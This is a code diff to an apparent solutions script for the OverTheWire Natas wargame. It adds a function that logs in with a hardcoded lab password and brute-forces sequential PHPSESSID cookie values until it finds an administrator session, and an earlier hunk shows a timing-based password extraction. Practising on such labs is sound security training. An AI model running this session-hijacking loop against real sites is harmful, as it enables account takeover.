@@ -68,6 +68,17 @@ def get_natas_18_password():
             print("Delta: ", response.elapsed, " Char: ", char)
     print("".join(password))
 
+def get_natas_19_password():
+    auth = HTTPBasicAuth(username="natas18", password="8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq")
+    for i in range(1,641):
+        response = post("http://natas18.natas.labs.overthewire.org/index.php", data={"username":str(1), "password":str(1)}, auth=auth, cookies={"PHPSESSID":str(i)})
+        if "You are logged in as a regular user." in response.text:
+            print("PHPSESSID",i,"normal user")
+        else:
+            print("PHPSESSID",i,"admin user")
+            print(response.text)
+            break
+
 
 if __name__ == "__main__":
-    get_natas_18_password()
+    get_natas_19_password()
